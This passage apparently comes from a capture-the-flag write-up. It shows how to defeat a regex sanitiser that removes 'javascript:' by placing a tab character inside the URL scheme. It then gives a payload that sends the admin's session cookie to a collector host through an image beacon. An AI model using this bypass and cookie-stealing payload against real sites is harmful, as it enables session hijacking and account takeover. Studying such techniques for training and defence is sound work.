The sanitiser is `re.sub(r"javascript:", "", url, flags=re.I)` — it deletes the
**exact substring** `javascript:`, once. The trick is that a browser does **not**
read the scheme so literally: before parsing a URL it strips tab (`U+0009`),
newline (`U+000A`) and carriage-return (`U+000D`) characters out of it.

So put a control character _inside_ the scheme. `java<TAB>script:` is not the
substring `javascript:` (the filter leaves it untouched), but the browser removes
the tab on navigation and reads it as `javascript:`. In a raw byte, that is a
literal 0x09 between `java` and `script`.

Now decide what the script should do. Your code runs in the admin's session, and
the admin `session` cookie is **not** `HttpOnly`, so `document.cookie` can read
it. Beacon it to the only listener the bot's network can reach:

```
javascript:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie))
```

`void(...)` keeps the `javascript:` URI from replacing the page with the
assignment's return value, so the beacon fires cleanly.
